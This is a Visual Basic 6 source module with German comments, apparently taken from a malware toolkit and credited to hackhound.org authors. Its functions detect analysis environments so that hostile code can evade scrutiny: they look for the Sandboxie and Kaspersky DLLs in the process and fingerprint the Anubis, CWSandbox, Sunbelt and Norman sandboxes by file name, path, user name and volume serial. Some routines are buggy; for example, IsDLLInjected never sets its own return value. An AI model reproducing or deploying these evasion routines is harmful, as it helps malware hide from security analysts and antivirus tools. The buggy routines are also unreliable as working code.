Attribute VB_Name = "Module2"
Private Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
    Const TH32CS_SNAPMODULE = &H8
    
Private Declare Function Module32First Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long

Private Declare Function Module32Next Lib "kernel32" (ByVal hSnapShot As Long, lppe As MODULEENTRY32) As Long

Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long

Private Type MODULEENTRY32
    dwSize As Long
    th32ModuleID As Long
    th32ProcessID As Long
    GlblcntUsage As Long
    ProccntUsage As Long
    modBaseAddr As Byte
    modBaseSize As Long
    hModule As Long
    szModule As String * 256
    szExePath As String * 1024
End Type
'</IsDLLInjected>

'<IsDLLInjected2>
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As Long
Private Declare Function FreeLibrary Lib "kernel32" (ByVal hModule As Long) As Long
'</IsDLLInjected2>

'<IsDLLInjected3>
Public Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
'</IsDLLInjected3>

'<AntiAnubis>
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
'</AntiAnubis>

'<AntiAnubis2>
Private Declare Function GetVolumeInformation Lib "kernel32.dll" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
'</AntiAnubis2>

'<NormanSandbox>
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" ( _
    ByVal lpBuffer As String, nSize As Long) As Long
'</NormanSandbox>



'HINWEIS: Ich halte IsDLLInjected2 für die beste Methode, da es die einzigen ist die auch die DLL von Kaspersky erkennt


Public Function IsDLLInjected2(DLLName As String) As Boolean
'Merkt wenn eine DLL Injected ist
'Funktioniert auch bei Kaspersky (anders als IsDLLInjected2)
'zB. bei Sandboxie oder Kaspersky (r3hook.dll)
'Coded by stoopid, modifiziert by Holy Darkness
    Dim hLoad As Long
    hLoad = LoadLibrary(DLLName)
    If hLoad <> 0 Then
        IsDLLInjected2 = True
    Else
        IsDLLInjected2 = False
    End If
    FreeLibrary (hLoad)
End Function


Public Function BDSandbox() As Long
BDSandbox = False
End Function

Public Function IsDLLInjected(DLLName As String) As Boolean
'Merkt wenn eine DLL Injected ist
'zB. bei Sandboxie
'Coded by stoopid, modifiziert by Holy Darkness
    Dim hSnapShot As Long
    Dim me32 As MODULEENTRY32
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId) 'create snapshot of current process modules
    me32.dwSize = Len(me32) 'get size of moduleentry32
    Module32First hSnapShot, me32 'get info about first module

    Do While Module32Next(hSnapShot, me32) <> 0 'loop through all modules

        'Original Zeile: If InStr(1, LCase(me32.szModule), LCase("SbieDll.dll")) > 0 Then 'module found
        If InStr(1, LCase(me32.szModule), LCase(DLLName)) > 0 Then 'module found
            IsInSandboxie = True
            Exit Do
        End If

    Loop

    CloseHandle (hSnapShot) 'close snapshot
End Function

Public Function IsDLLInjected3(DLLName As String) As Boolean
'Yet Another Anti Sandboxie Method - Visual Basic
'by steve10120
'http://hackhound.org

    Dim hMod As Long
    
    hMod = GetModuleHandle("SbieDll.dll")
    
    If hMod <> 0 Then IsDLLInjected3 = True
End Function

Public Function IsInAnubis() As Boolean
    Dim szBuffer As String * 255
    GetModuleFileName 0, szBuffer, 255
    If InStr(1, szBuffer, "sample.exe") > 0 Then
        IsInAnubis = True
    End If
End Function

Public Function GetSerialNumber(strDrive As String) As Long
    Dim SerialNum As Long
    Dim res As Long
    Dim Temp1 As String
    Dim Temp2 As String
      
    Temp1 = String$(255, Chr$(0))
    Temp2 = String$(255, Chr$(0))
    res = GetVolumeInformation(strDrive, Temp1, Len(Temp1), SerialNum, 0, 0, _
    Temp2, Len(Temp2))
      
    ' this will be the value returned by the function
    GetSerialNumber = SerialNum
End Function

Public Function IsCWSandbox() As Boolean
    If App.Path = "H:\" And Environ("username") = "Schmidti" Then IsCWSandbox = True
End Function

Public Function IsSunbelt() As Boolean
    If App.EXEName = "file" And App.Path = "C:\" Then IsSunbelt = True
End Function

